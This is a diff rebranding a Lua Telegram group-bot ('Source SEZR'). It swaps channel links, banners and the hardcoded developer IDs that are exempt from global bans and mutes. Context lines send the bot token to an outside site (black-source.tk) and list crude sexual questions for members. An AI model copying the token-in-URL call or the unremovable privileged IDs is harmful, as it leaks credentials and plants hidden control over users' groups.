 local Text = 'تـم اخـتيار هـذه الـصوره لـك 🌚💘'  
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3543,7 +3548,7 @@ ght = math.random(1,62);
 local Text = 'تـم اخـتيار هـذه الـصوره لـك 🌚💘'  
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3554,7 +3559,7 @@ ght = math.random(1,33);
 local Text ='مرحبا اليك بوسات بي الصوره'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }  
 local msg_id = msg.id_/2097152/0.5  
@@ -3565,7 +3570,7 @@ ght = math.random(1,18);
 local Text ='مرحبا اليك معلومه جديده في صوره🌚💘' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -3576,7 +3581,7 @@ ght = math.random(1,33);
 local Text ='إليك صور كرتون إنمي 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
@@ -3587,7 +3592,7 @@ ght = math.random(1,33);
 local Text ='مرحبا اليك خلفيه جميله يا بتاع الحب 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5  
@@ -3598,7 +3603,7 @@ ght = math.random(1,33);
 local Text ='مرحبا اليك فلام من الافلام الاجنبيه 🌚💘'
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '??𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
@@ -3609,7 +3614,7 @@ ght = math.random(1,33);
 local Text ='مرحبا اليك فلام عربي من افضل الافلام 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5  
@@ -3620,7 +3625,7 @@ ght = math.random(1,33);
 local Text ='إليك حلقه من بعض أفلام الكرتون يطفل 🙈😂'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
@@ -3631,7 +3636,7 @@ ght = math.random(1,33);
 local Text ='تم أختيار الفيديو الأجنبي إليك الأن 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }
 local msg_id = msg.id_/2097152/0.5  
@@ -3642,7 +3647,7 @@ ght = math.random(1,33);
 local Text ='تم اختيار اغنيه عشوائية من اغني بفديو 🌚💘'  
 keyboard = {}   
 keyboard.inline_keyboard = {  
-{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/surccesezr"}},
+{{text =  '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑' ,url="t.me/A_F_fwdka1"}},
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 }  
 local msg_id = msg.id_/2097152/0.5  
@@ -4187,7 +4192,7 @@ local TWEET_Msg = {
 "اخر مره قمت بزياره المواقع الايباحيه 😱🥵",
 "بدك تمارسي العاده السريه من الامام ام الخلف 😱🥵",
 "ما المكان المفضل لك في ممارسه الجنس 😱🥵",
-" متي قمت بممارسه العاده السريه اخر مره 😱🥵",
+" متي قمت بممارسه العاده السريه اخر مره 😱??",
 " ما لون ملابسك الداخليه المفضل 😱🥵",
 "ما مقاس البرا التي ترتديها الان 😱🥵",
 " كم مرا نكت بنت 😱🥵",
@@ -4496,14 +4501,14 @@ local Text = [[
 من أحسن السورسات على التليجرام سورس السيزر
 حمايه↤سرعه↤دقه↤وامان
  قناه السورس ⇈⇊
-[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙾𝙳𝚃𝙺𝙰](http://t.me/surccesezr)
+[𝚆𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 𝚂𝙾𝚄𝚁𝙲𝙴 𝚅𝙾𝙳𝚃𝙺𝙰](http://t.me/A_F_fwdka1)
 ]]
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'التواصل' or text == 'التوصل' or text == 'بوت توصل' or text == 'بوت تواصل' then
 database:del(bot_id..'Srt:Bot') 
@@ -4512,10 +4517,10 @@ local Text = [[
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5
-https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/surccesezr/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/A_F_fwdka1/148/163&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'العاب السيزر' or text == 'العاب سيزر' or text == 'العاب المتطوره' then  
 local Text = [[  
@@ -4549,7 +4554,7 @@ keyboard.inline_keyboard = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}},
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
 https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/Qwressv/161&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -4654,7 +4659,7 @@ GetFile_Bot(msg)
 end
 if text == 'الاوامر المضافه' and Constructor(msg) then
 local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
-t = " 🌕 قائمه الاوامر المضافه  \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = " 🌕 قائمه الاوامر المضافه  \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
 print(Cmds)
@@ -4733,7 +4738,7 @@ else
 tdcli_function ({ID = "GetUser",user_id_ = SUDO,},function(arg,result) 
 local function taha(extra, taha, success)
 if taha.photos_[0] then
-local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/surccesezr)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
+local Name = '[معاك مطور البوت اهو ياروحي ⇈⇊](t.me/A_F_fwdka1)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -4757,7 +4762,7 @@ ght = math.random(1,28);
 local Text ='مرحبا إليك تويت بالصور🌚💘' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -4778,7 +4783,7 @@ ght = math.random(1,15);
 local Text ='مرحبا إليك حروف بالصوره🌚💘' 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/surccesezr"}}, 
+{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑', url="t.me/A_F_fwdka1"}}, 
 {{text = 'أضغط لاضافه ألبوت لمجموعتك 🌕' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
@@ -5698,7 +5703,7 @@ return false
 end
 if text == ("قائمه العام") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GDRG:User')
-t = "\n 🌕 قائمة المحظورين عام \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المحظورين عام \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -5733,15 +5738,15 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1804119251) then  
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1437997996) then  
+if tonumber(result.sender_user_id_) == tonumber(1372188096) then  
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1454003618) then  
+if tonumber(result.sender_user_id_) == tonumber(1770493345) then  
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مبرمج السورس عام")
 return false 
 end
@@ -5792,7 +5797,7 @@ send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك حظر مالك السورس 
 return false 
 end
 if result.id_ == tonumber(1815428019) then
-send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك حظر مالك ديشا \n")
+send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك حظر مالك الديشا \n")
 return false 
 end
 usertext = '\n 🌕 العضو ← ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
@@ -5836,7 +5841,7 @@ send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مالك السورس 
 return false 
 end
 if tonumber(userid) == tonumber(1815428019) then  
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مالك ديشا عام")
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع حظر مالك الديشا عام")
 return false 
 end
 database:sadd(bot_id..'GBan:User', userid)
@@ -5872,16 +5877,16 @@ if tonumber(result.sender_user_id_) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
+if tonumber(result.sender_user_id_) == tonumber(1804119251) then  
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1437997996) then  
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج سيزر عام")
+if tonumber(result.sender_user_id_) == tonumber(1372188096) then  
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج عموري عام")
 return false 
 end
-if tonumber(result.sender_user_id_) == tonumber(1454003618) then  
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مالك ديشا عام")
+if tonumber(result.sender_user_id_) == tonumber(1770493345) then  
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مالك الديشا عام")
 return false 
 end
 database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
@@ -5921,16 +5926,16 @@ if result.id_ == tonumber(SUDO) then
 send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك كتم المطور الاساسي \n")
 return false 
 end
-if result.id_ == tonumber(1965534755) then
+if result.id_ == tonumber(1804119251) then
 send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك كتم مبرمج السورس \n")
 return false 
 end
-if result.id_ == tonumber(1437997996) then
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج سيزر عام \n")
+if result.id_ == tonumber(1372188096) then
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج عموري عام \n")
 return false 
 end
-if result.id_ == tonumber(1454003618) then
-send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك كتم مالك ديشا \n")
+if result.id_ == tonumber(1770493345) then
+send(msg.chat_id_, msg.id_, " 🌕 لا يمكنك كتم مالك الديشا \n")
 return false 
 end
 usertext = '\n 🌕 العضو ← ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
@@ -5965,16 +5970,16 @@ if tonumber(userid) == tonumber(bot_id) then
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم البوت عام")
 return false 
 end
-if tonumber(userid) == tonumber(1965534755) then  
+if tonumber(userid) == tonumber(1804119251) then  
 send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مبرمج السورس عام")
 return false 
 end
-if tonumber(userid) == tonumber(1437997996) then  
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج سيزر عام")
+if tonumber(userid) == tonumber(1372188096) then  
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم المبرمج عموري عام")
 return false 
 end
-if tonumber(userid) == tonumber(1454003618) then  
-send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مالك ديشا عام")
+if tonumber(userid) == tonumber(1770493345) then  
+send(msg.chat_id_, msg.id_, " 🌕 لا تسطيع كتم مالك الديشا عام")
 return false 
 end
 database:sadd(bot_id..'Gmute:User', userid)
@@ -6073,7 +6078,7 @@ send(msg.chat_id_, msg.id_, "\n 🌕 تم مسح قائمة المطورين  ")
 end
 if text == ("المطورين") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
-t = "\n 🌕  قائمة مطورين البوت \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕  قائمة مطورين البوت \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6160,7 +6165,7 @@ end
 
 
 if text == 'الملفات' and DevSoFi(msg) then
-t = ' 🌕 ملفات السورس السيزر 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 𖣘━┅┄⟞⟦𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n'
+t = ' 🌕 ملفات السورس السيزر ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺ \n'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
 if v:match(".lua$") then
@@ -6177,8 +6182,8 @@ if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
 if Get_info then
-local TextS = "\n 🌕 اهلا بك في متجر ملفات السيزر\n 🌕 ملفات السورس 𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
-local TextE = "\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n 🌕 علامة تعني { ✔️ } ملف مفعل\n 🌕 علامة تعني { ✖ } ملف معطل\n 🌕 قناة سورس السيزر𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n".." 🌕 [اضغط هنا لدخول](t.me/surccesezr) \n"
+local TextS = "\n 🌕 اهلا بك في متجر ملفات السيزر\n 🌕 ملفات السورس ⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
+local TextE = "\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n 🌕 علامة تعني { ✔️ } ملف مفعل\n 🌕 علامة تعني { ✖ } ملف معطل\n 🌕 قناة سورس السيزر⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n".." 🌕 [اضغط هنا لدخول](t.me/A_F_fwdka1) \n"
 local NumFile = 0
 for name,Info in pairs(res.plugins_) do
 local Check_File_is_Found = io.open("File_Bot/"..name,"r")
@@ -6400,7 +6405,7 @@ end
 
 if text == 'قائمه السيزر' and Sudo(msg) then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
-t = "\n 🌕 قائمه السيزر\n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمه السيزر\n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6417,7 +6422,7 @@ return false
 end
 if text == ("صيح للمالك") or text == ("تاك للمالك") then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6584,7 +6589,7 @@ st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..tok
 eker = JSON.decode(st)
 if eker.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
-t = " 🌕 المنشئين الاساسين تعالو مخرب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = " 🌕 المنشئين الاساسين تعالو مخرب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6696,7 +6701,7 @@ return false
 end
 if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
-t = "\n 🌕 قائمة المنشئين الاساسين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المنشئين الاساسين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6713,7 +6718,7 @@ return false
 end
 if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6902,7 +6907,7 @@ end
 
 if text == ("المنشئين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
-t = "\n 🌕 قائمة المنشئين \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 قائمة المنشئين \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -6918,7 +6923,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7116,7 +7121,7 @@ send(msg.chat_id_, msg.id_, t)
 end
 if text == ("تاك للمدراء") or text == ("صيح المدراء") then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
-t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕 وينكم تعالو يريدوكم بالجروب \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7337,7 +7342,7 @@ return false
 end
 if text == ("الثانوين") and SudoBot(msg) then
 local list = database:smembers(bot_id.."Dev:SoFi:2")
-t = "\n 🌕  قائمة مطورين الثانويين للبوت \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
+t = "\n 🌕  قائمة مطورين الثانويين للبوت \n⩹━━━━━❲𖥳 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑 𖥳❳━━━━━⩺\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -7680,7 +7685,7 @@ send(msg.chat_id_, msg.id_, ' 🌕 تم مسح الادمنيه')
 end
 if text == ("الادمنيه") and Manager(msg) then
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
-t = "\n 🌕 قائمة الادمنيه \n𖣘━┅┄⟞⟦ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐒𝐄𝐙𝐑⟧⟝┄┉━𖣘\n"
